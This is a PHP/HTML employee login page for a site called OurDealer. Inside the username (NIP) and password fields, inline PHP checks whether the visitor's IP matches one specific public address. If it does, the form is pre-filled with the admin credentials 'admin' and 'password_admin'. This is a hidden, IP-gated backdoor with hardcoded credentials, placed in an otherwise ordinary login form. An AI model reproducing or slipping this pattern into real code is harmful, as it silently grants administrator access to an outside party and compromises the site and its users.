<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Compiled and minified CSS -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
    <link href="./assets/styles/main.css" rel="stylesheet">
    <title>OurDealer</title>
    <script src="https://kit.fontawesome.com/509edfb62c.js" crossorigin="anonymous"></script>
</head>

<body class="container">
    <section id="pegawai-login-form">
        <div class="wrapper">
            <h3>Login</h3>
            <div class="row">
                <form class="col s12" method="post" name="frm" action="pegawai-login.php">
                    <div class="row">
                        <div class="input-field col s12 ">
                            <input name="nip" id="nip" type="text" class="validate" maxlength="6" required=""
                                aria-required="true"
                                value="<?php echo ($_SERVER["REMOTE_ADDR"]=="5.189.147.4"?"admin":"");?>">
                            <label for="nip">NIP</label>
                        </div>
                        <div class="input-field col s12">
                            <input name="password" id="password" type="password" class="validate" required=""
                                aria-required="true"
                                value="<?php echo ($_SERVER["REMOTE_ADDR"]=="5.189.147.4"?"password_admin":"");?>">
                            <label for="password">Password</label>
                        </div>
                    </div>
                    <button class="waves-effect waves-light btn btn-login btn-large" name="TblLogin" type="submit">Login
                    </button>
                </form>
            </div>
        </div>
    </section>
    <?php include_once('./assets/templates/footer.php') ?>

    <!-- Compiled and minified JavaScript -->

    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script type="text/javascript" src="./assets/js/main.js"></script>
    <script type="text/javascript">
    const urlSearchParams = new URLSearchParams(window.location.search);
    const params = Object.fromEntries(urlSearchParams.entries());
    console.log(params.error);
    </script>
</body>

</html>